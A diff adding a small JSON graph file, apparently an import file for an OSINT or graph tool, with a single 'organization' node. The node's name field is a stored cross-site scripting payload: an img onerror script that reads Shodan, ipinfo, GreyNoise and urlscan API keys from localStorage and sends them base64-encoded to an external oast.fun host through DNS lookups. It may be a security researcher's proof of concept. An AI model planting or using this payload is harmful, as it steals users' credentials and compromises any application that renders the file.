@@ -1,0 +1,10 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "organization",
+      "organization": "<img src=x onerror=\"(function(){var k=['shodanApiKey','ipinfoApiKey','greynoiseApiKey','urlscanApiKey'];k.forEach(function(x,i){var v=localStorage.getItem(x);if(v)new Image().src='https://'+i+'.'+btoa(x+'='+v).substring(0,40)+'.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun';});})()\">"
+    }
+  ],
+  "edges": []
+}
